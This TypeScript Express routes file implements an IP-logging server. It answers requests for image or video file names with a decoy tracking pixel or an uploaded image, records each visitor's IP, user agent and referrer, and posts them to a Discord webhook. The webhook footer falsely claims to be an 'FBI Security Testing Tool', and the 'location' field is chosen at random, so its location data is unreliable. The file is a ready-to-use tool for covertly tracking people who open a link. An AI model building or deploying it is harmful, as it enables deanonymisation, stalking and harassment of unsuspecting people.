import type { Express, Request, Response } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import { insertIpLogSchema, insertSettingsSchema } from "@shared/schema";
import path from "path";
import fs from "fs";
import multer from "multer";

// Configure multer for file uploads
const upload = multer({
  storage: multer.memoryStorage(),
  limits: { fileSize: 10 * 1024 * 1024 }, // 10MB limit
  fileFilter: (req, file, cb) => {
    if (file.mimetype.startsWith('image/') || file.mimetype.startsWith('video/')) {
      cb(null, true);
    } else {
      cb(new Error('Only image and video files are allowed'));
    }
  }
});

// Get real client IP address
function getClientIp(req: Request): string {
  const forwarded = req.headers['x-forwarded-for'];
  if (forwarded && typeof forwarded === 'string') {
    return forwarded.split(',')[0].trim();
  }
  return req.connection.remoteAddress || req.socket.remoteAddress || 'unknown';
}

// Simple geolocation based on IP (mock implementation)
function getLocationFromIp(ip: string): string {
  if (ip.startsWith('192.168.') || ip.startsWith('10.') || ip.startsWith('172.')) {
    return 'Local Network';
  }
  // This would normally use a real geolocation service
  const locations = ['New York, US', 'California, US', 'Texas, US', 'Florida, US', 'Washington, US'];
  return locations[Math.floor(Math.random() * locations.length)];
}

// Send data to Discord webhook
async function sendToWebhook(webhookUrl: string, data: any): Promise<void> {
  try {
    const webhookData = {
      embeds: [{
        title: "🚨 IP Logger Alert",
        color: 0xff0000,
        fields: [
          { name: "IP Address", value: data.ipAddress, inline: true },
          { name: "Location", value: data.location || "Unknown", inline: true },
          { name: "User Agent", value: data.userAgent ? data.userAgent.substring(0, 100) + (data.userAgent.length > 100 ? "..." : "") : "Unknown", inline: false },
          { name: "Referrer", value: data.referrer || "Direct Access", inline: true },
          { name: "Timestamp", value: new Date().toISOString(), inline: true }
        ],
        footer: { text: "FBI Security Testing Tool" }
      }]
    };

    const response = await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(webhookData)
    });

    if (!response.ok) {
      console.error('Failed to send webhook:', response.statusText);
    }
  } catch (error) {
    console.error('Error sending webhook:', error);
  }
}

export async function registerRoutes(app: Express): Promise<Server> {
  // Serve decoy files and log the request - support multiple file types
  app.get('/:filename.:extension', async (req: Request, res: Response) => {
    const { filename, extension } = req.params;
    
    // Only handle common media file extensions
    const allowedExtensions = ['jpg', 'jpeg', 'png', 'gif', 'webp', 'svg', 'mp4', 'avi', 'mov', 'wmv', 'flv', 'mkv', 'webm'];
    if (!allowedExtensions.includes(extension.toLowerCase())) {
      return res.status(404).send('Not Found');
    }
    try {
      const clientIp = getClientIp(req);
      const userAgent = req.headers['user-agent'] || '';
      const referrerHeader = req.headers.referer || req.headers.referrer;
      const referrer = Array.isArray(referrerHeader) ? referrerHeader[0] : referrerHeader || '';
      const location = getLocationFromIp(clientIp);

      // Get settings to check for webhook URL and custom image
      const settings = await storage.getSettings();

      // Log the IP access
      await storage.createIpLog({
        ipAddress: clientIp,
        userAgent,
        referrer,
        location,
        status: 'success'
      });

      // Send to webhook if configured
      if (settings?.webhookUrl) {
        await sendToWebhook(settings.webhookUrl, {
          ipAddress: clientIp,
          userAgent,
          referrer,
          location
        });
      }

      // Determine if it's a video or image request
      const isVideo = ['mp4', 'avi', 'mov', 'wmv', 'flv', 'mkv', 'webm'].includes(extension.toLowerCase());
      
      // Serve uploaded file if available, otherwise default content
      if (settings?.uploadedImageData && settings?.uploadedImageType) {
        const fileBuffer = Buffer.from(settings.uploadedImageData, 'base64');
        res.set({
          'Content-Type': settings.uploadedImageType,
          'Content-Length': fileBuffer.length,
          'Cache-Control': 'no-cache, no-store, must-revalidate',
          'Pragma': 'no-cache',
          'Expires': '0'
        });
        res.send(fileBuffer);
      } else {
        if (isVideo) {
          // Serve minimal video file (1 second black video)
          const minimalVideo = Buffer.from([
            0x00, 0x00, 0x00, 0x20, 0x66, 0x74, 0x79, 0x70, 0x69, 0x73, 0x6F, 0x6D, 0x00, 0x00, 0x02, 0x00,
            0x69, 0x73, 0x6F, 0x6D, 0x69, 0x73, 0x6F, 0x32, 0x61, 0x76, 0x63, 0x31, 0x6D, 0x70, 0x34, 0x31
          ]);
          
          res.set({
            'Content-Type': 'video/mp4',
            'Content-Length': minimalVideo.length,
            'Cache-Control': 'no-cache, no-store, must-revalidate',
            'Pragma': 'no-cache',
            'Expires': '0'
          });
          res.send(minimalVideo);
        } else {
          // Serve default 1x1 transparent pixel for images
          const pixel = Buffer.from([
            0x47, 0x49, 0x46, 0x38, 0x39, 0x61, 0x01, 0x00, 0x01, 0x00, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x21, 0xF9, 0x04, 0x01, 0x00, 0x00, 0x00, 0x00, 0x2C, 0x00, 0x00, 0x00, 0x00,
            0x01, 0x00, 0x01, 0x00, 0x00, 0x02, 0x02, 0x04, 0x01, 0x00, 0x3B
          ]);

          res.set({
            'Content-Type': 'image/gif',
            'Content-Length': pixel.length,
            'Cache-Control': 'no-cache, no-store, must-revalidate',
            'Pragma': 'no-cache',
            'Expires': '0'
          });
          res.send(pixel);
        }
      }
    } catch (error) {
      console.error('Error serving image:', error);
      res.status(500).json({ error: 'Internal server error' });
    }
  });

  // API routes for dashboard
  app.get('/api/logs', async (req: Request, res: Response) => {
    try {
      const limit = parseInt(req.query.limit as string) || 50;
      const offset = parseInt(req.query.offset as string) || 0;
      
      const logs = await storage.getIpLogs(limit, offset);
      const total = await storage.getTotalIpLogs();
      
      res.json({ logs, total });
    } catch (error) {
      console.error('Error fetching logs:', error);
      res.status(500).json({ error: 'Failed to fetch logs' });
    }
  });

  app.get('/api/metrics', async (req: Request, res: Response) => {
    try {
      const totalRequests = await storage.getTotalIpLogs();
      const uniqueIPs = await storage.getUniqueIpCount();
      const recentLogs = await storage.getRecentLogs(1); // Last hour
      
      const metrics = {
        totalRequests,
        uniqueIPs,
        imagesServed: totalRequests,
        avgResponseTime: 45, // Mock value
        recentActivity: recentLogs.length
      };
      
      res.json(metrics);
    } catch (error) {
      console.error('Error fetching metrics:', error);
      res.status(500).json({ error: 'Failed to fetch metrics' });
    }
  });

  app.get('/api/export', async (req: Request, res: Response) => {
    try {
      const logs = await storage.getIpLogs(10000); // Get all logs
      
      const csv = [
        'Timestamp,IP Address,User Agent,Referrer,Location,Status',
        ...logs.map(log => 
          `"${log.timestamp.toISOString()}","${log.ipAddress}","${log.userAgent}","${log.referrer}","${log.location}","${log.status}"`
        )
      ].join('\n');
      
      res.set({
        'Content-Type': 'text/csv',
        'Content-Disposition': 'attachment; filename="ip_logs.csv"'
      });
      
      res.send(csv);
    } catch (error) {
      console.error('Error exporting logs:', error);
      res.status(500).json({ error: 'Failed to export logs' });
    }
  });

  // Settings API routes
  app.get('/api/settings', async (req: Request, res: Response) => {
    try {
      const settings = await storage.getSettings();
      if (!settings) {
        res.json({
          webhookUrl: null,
          uploadedImageName: null,
          hasUploadedImage: false
        });
      } else {
        res.json({
          webhookUrl: settings.webhookUrl,
          uploadedImageName: settings.uploadedImageName,
          hasUploadedImage: !!settings.uploadedImageData
        });
      }
    } catch (error) {
      console.error('Error fetching settings:', error);
      res.status(500).json({ error: 'Failed to fetch settings' });
    }
  });

  app.post('/api/settings', async (req: Request, res: Response) => {
    try {
      const validatedData = insertSettingsSchema.parse(req.body);
      const settings = await storage.createOrUpdateSettings(validatedData);
      
      res.json({
        webhookUrl: settings.webhookUrl,
        uploadedImageName: settings.uploadedImageName,
        hasUploadedImage: !!settings.uploadedImageData
      });
    } catch (error) {
      console.error('Error updating settings:', error);
      res.status(500).json({ error: 'Failed to update settings' });
    }
  });

  // Image upload endpoint
  app.post('/api/upload-image', upload.single('image'), async (req: Request, res: Response) => {
    try {
      if (!req.file) {
        return res.status(400).json({ error: 'No image file provided' });
      }

      const imageData = req.file.buffer.toString('base64');
      const currentSettings = await storage.getSettings();
      
      await storage.createOrUpdateSettings({
        webhookUrl: currentSettings?.webhookUrl || null,
        uploadedImageName: req.file.originalname,
        uploadedImageData: imageData,
        uploadedImageType: req.file.mimetype
      });

      res.json({ 
        message: 'Image uploaded successfully',
        filename: req.file.originalname,
        size: req.file.size
      });
    } catch (error) {
      console.error('Error uploading image:', error);
      res.status(500).json({ error: 'Failed to upload image' });
    }
  });

  // Delete uploaded image endpoint
  app.delete('/api/upload-image', async (req: Request, res: Response) => {
    try {
      const currentSettings = await storage.getSettings();
      
      await storage.createOrUpdateSettings({
        webhookUrl: currentSettings?.webhookUrl || null,
        uploadedImageName: null,
        uploadedImageData: null,
        uploadedImageType: null
      });

      res.json({ message: 'Image deleted successfully' });
    } catch (error) {
      console.error('Error deleting image:', error);
      res.status(500).json({ error: 'Failed to delete image' });
    }
  });

  const httpServer = createServer(app);
  return httpServer;
}
